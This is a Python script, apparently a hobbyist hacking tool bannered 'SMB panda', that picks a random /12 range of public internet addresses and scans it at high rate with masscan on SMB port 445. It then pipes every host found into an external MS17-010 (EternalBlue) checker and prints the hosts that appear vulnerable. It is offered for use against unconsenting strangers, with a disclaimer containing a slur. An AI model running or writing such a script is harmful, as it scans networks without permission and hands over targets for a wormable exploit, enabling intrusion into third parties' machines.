import socket
import random
import os

ip = ".".join(map(str, (random.randint(0, 255) 
                        for _ in range(2))))

ipadd = (ip +".0.0/12")

print(ipadd)

os.system('clear')

os.system('rm dep/out.txt')

os.system('rm dep/scan2.sh')


print("...$$$$$$\................$$$$$$$\............................................$$\...........")
print('..$$..__$$\...............$$..__$$\...........................................$$.|..........')
print('..$$./..\__|$$$$$$\$$$$\..$$.|..$$.|.......$$$$$$\...$$$$$$\..$$$$$$$\...$$$$$$$.|.$$$$$$\..')
print('..\$$$$$$\..$$.._$$.._$$\.$$$$$$$\.|......$$..__$$\..\____$$\.$$..__$$\.$$..__$$.|.\____$$\.')
print('...\____$$\.$$./.$$./.$$.|$$..__$$\.......$$./..$$.|.$$$$$$$.|$$.|..$$.|$$./..$$.|.$$$$$$$.|')
print('..$$\...$$.|$$.|.$$.|.$$.|$$.|..$$.|......$$.|..$$.|$$..__$$.|$$.|..$$.|$$.|..$$.|$$..__$$.|')
print('..\$$$$$$..|$$.|.$$.|.$$.|$$$$$$$..|......$$$$$$$..|\$$$$$$$.|$$.|..$$.|\$$$$$$$.|\$$$$$$$.|')
print('...\______/.\__|.\__|.\__|\_______/.......$$..____/..\_______|\__|..\__|.\_______|.\_______|')
print('..........................................$$.|..............................................') 
print('..........................................$$.|..............................................')
print('..........................................\__|..............................................')

print(' (IM NOT RESPONSEABLE FOR YOUR RETARTED DECISIONS)')

#ip = ".".join(map(str, (random.randint(0, 255) 
 #                       for _ in range(4))))


print("")

print('!!!IF IT SAYS found=0 THEN TRY AGAIN ( it can take up to 10 tries to find a valid range )!!!')
#ip = raw_input("RANGE (example 74.35.0.0/12):  ")
#type(ip)
print('u r scanning', ipadd)
os.system('masscan -p445,445 ' + ipadd +' --rate=10000 > dep/out.txt' )

os.system("cat dep/out.txt | grep Dis | cut -b 33,34,35,36,37,38,39,40,41,42,43,44,45,46,47 | sed  -e 's/^/go run ms17-010.go -h /' > dep/scan2.sh")

os.system('clear')

os.system('chmod 777 dep/scan2.sh')

print("...$$$$$$\................$$$$$$$\............................................$$\...........")
print('..$$..__$$\...............$$..__$$\...........................................$$.|..........')
print('..$$./..\__|$$$$$$\$$$$\..$$.|..$$.|.......$$$$$$\...$$$$$$\..$$$$$$$\...$$$$$$$.|.$$$$$$\..')
print('..\$$$$$$\..$$.._$$.._$$\.$$$$$$$\.|......$$..__$$\..\____$$\.$$..__$$\.$$..__$$.|.\____$$\.')
print('...\____$$\.$$./.$$./.$$.|$$..__$$\.......$$./..$$.|.$$$$$$$.|$$.|..$$.|$$./..$$.|.$$$$$$$.|')
print('..$$\...$$.|$$.|.$$.|.$$.|$$.|..$$.|......$$.|..$$.|$$..__$$.|$$.|..$$.|$$.|..$$.|$$..__$$.|')
print('..\$$$$$$..|$$.|.$$.|.$$.|$$$$$$$..|......$$$$$$$..|\$$$$$$$.|$$.|..$$.|\$$$$$$$.|\$$$$$$$.|')
print('...\______/.\__|.\__|.\__|\_______/.......$$..____/..\_______|\__|..\__|.\_______|.\_______|')
print('..........................................$$.|..............................................') 
print('..........................................$$.|..............................................')
print('..........................................\__|..............................................')


print('IT TAKES A COUPLE MINUTES TO DO ITS THING SO DONT BE IMPATIENT !!!')


print("u r scanning", ipadd)

print("")

print("")

print("")

print("")

print('working ....')

os.system('rm dep/vuln.txt')
os.system('bash dep/scan2.sh ')
os.system('bash dep/scan2.sh > dep/vuln.txt')

os.system('clear')




print("...$$$$$$\................$$$$$$$\............................................$$\...........")
print('..$$..__$$\...............$$..__$$\...........................................$$.|..........')
print('..$$./..\__|$$$$$$\$$$$\..$$.|..$$.|.......$$$$$$\...$$$$$$\..$$$$$$$\...$$$$$$$.|.$$$$$$\..')
print('..\$$$$$$\..$$.._$$.._$$\.$$$$$$$\.|......$$..__$$\..\____$$\.$$..__$$\.$$..__$$.|.\____$$\.')
print('...\____$$\.$$./.$$./.$$.|$$..__$$\.......$$./..$$.|.$$$$$$$.|$$.|..$$.|$$./..$$.|.$$$$$$$.|')
print('..$$\...$$.|$$.|.$$.|.$$.|$$.|..$$.|......$$.|..$$.|$$..__$$.|$$.|..$$.|$$.|..$$.|$$..__$$.|')
print('..\$$$$$$..|$$.|.$$.|.$$.|$$$$$$$..|......$$$$$$$..|\$$$$$$$.|$$.|..$$.|\$$$$$$$.|\$$$$$$$.|')
print('...\______/.\__|.\__|.\__|\_______/.......$$..____/..\_______|\__|..\__|.\_______|.\_______|')
print('..........................................$$.|..............................................') 
print('..........................................$$.|..............................................')
print('..........................................\__|..............................................')


print('FINAL RESULTS !!!(if there are none then try again)')


os.system('cat dep/vuln.txt')
